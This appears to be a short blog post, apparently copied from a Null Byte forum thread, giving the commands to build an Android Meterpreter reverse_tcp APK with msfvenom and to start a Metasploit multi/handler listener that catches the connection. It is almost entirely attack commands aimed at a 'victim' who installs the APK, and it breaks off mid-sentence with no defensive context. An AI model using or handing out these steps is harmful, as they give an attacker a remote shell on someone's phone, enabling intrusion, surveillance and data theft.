---
layout: pst
title: "MSF: Android/Meterpreter/reverse_tcp"
date:   2021-01-24 21:20:43 +0800
categories: sec
permalink: /:categories/:title
---
Source: <a href="https://null-byte.wonderhowto.com/forum?create-and-use-android-meterpreter-reverse-tcp-apk-with-msfvenom-0162921/">https://null-byte.wonderhowto.com/forum?create-and-use-android-meterpreter-reverse-tcp-apk-with-msfvenom-0162921/</a>


LHOST = host ip
LPORT = host port

Create payload using msfvenom:
{% highlight console %}
    $msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.0.111 LPORT=8000 > name.apk
{% endhighlight %}

On the atackker side:
{% highlight console %}
    $msfconsole
{% endhighlight %}
{% highlight console %}
    $use  exploit/multi/handler
    $set payload android/meterpreter/reverse_tcp
    $set lhost 192.168.0.111
    $set lport 8000
    $exploit
{% endhighlight %}

When the victim installed the payload 